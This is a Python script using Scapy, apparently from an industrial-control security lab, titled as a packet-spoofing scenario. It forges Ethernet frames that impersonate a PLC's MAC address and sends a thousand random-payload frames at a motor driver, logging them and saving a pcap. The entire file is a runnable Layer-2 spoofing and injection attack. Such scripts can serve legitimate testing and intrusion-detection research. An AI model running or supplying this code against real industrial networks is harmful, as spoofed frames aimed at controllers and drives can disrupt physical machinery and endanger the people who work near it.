# First Scenario: Low-burst random packet spoofing

import os
import sys
import time
import random
import logging
from scapy.all import Ether, sendp, conf, wrpcap, Packet, Raw

# ----- CONFIG -----
IFACE = "eth0"                       # change if needed
SRC_MAC ="30:b8:51:03:21:a2"         # MAC Address PLC
DST_MAC_TEST = "00:0d:1e:1c:64:32"   # MAC Address Motor Deiver
PACKETS = 1000                       # total packets to send
INTERVAL = 0                         # seconds between packets (20 pps)
PAYLOAD_MIN = 32                     # min payload bytes
PAYLOAD_MAX = 600                    # max payload bytes
LOG_FILE = "/tmp/layer2_sender.log"  # log of sends
PCAP_SAVE = "/tmp/layer2_sent.pcap"  # optional: save sent frames
VERBOSE_PROGRESS = True
# -------------------

# Setup logger
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("layer2_sender")

def random_payload(min_len, max_len):
    """Return a bytes payload with an embedded ASCII test tag and random bytes."""
    l = random.randint(min_len, max_len)
    # include a short ASCII tag to help Wireshark and later parsing
    tag = f"LABTAG:{int(time.time())}:{random.randint(0,9999)}|"
    tag_bytes = tag.encode(errors='ignore')
    rand_len = max(0, l - len(tag_bytes))
    rand_bytes = bytes(random.getrandbits(8) for _ in range(rand_len))
    return tag_bytes + rand_bytes

def make_frame(dst_mac, src_mac, payload):
    return Ether(dst=dst_mac, src=src_mac) / Raw(load=payload)

def main():
    if os.geteuid() != 0:
        logger.error("This script must be run as root (sudo). Exiting.")
        sys.exit(1)

    logger.info(f"Interface: {IFACE}")
    logger.info(f"Destination (test) MAC: {DST_MAC_TEST}")
    logger.info(f"Packets to send: {PACKETS}, interval: {INTERVAL}s")
    conf.iface = IFACE

    frames_to_save = []
    sent = 0
    try:
        for i in range(PACKETS):
            payload = random_payload(PAYLOAD_MIN, PAYLOAD_MAX)
            frame = make_frame(DST_MAC_TEST, SRC_MAC, payload)
            # send at layer 2, non-verbose
            sendp(frame, iface=IFACE, verbose=False)
            frames_to_save.append(frame)
            sent += 1
            if VERBOSE_PROGRESS and (i % 10 == 0):
                logger.info(f"Sent {i+1}/{PACKETS} frames")
            time.sleep(INTERVAL)
    except KeyboardInterrupt:
        logger.warning("User interrupted sending.")
    except Exception as e:
        logger.exception("Exception during send: %s", e)

    logger.info(f"Finished. Sent {sent} frames.")
    # save pcap
    try:
        if frames_to_save:
            wrpcap(PCAP_SAVE, frames_to_save)
            logger.info(f"Saved sent frames to {PCAP_SAVE}")
    except Exception:
        logger.exception("Failed to write pcap")

if __name__ == "__main__":
    main()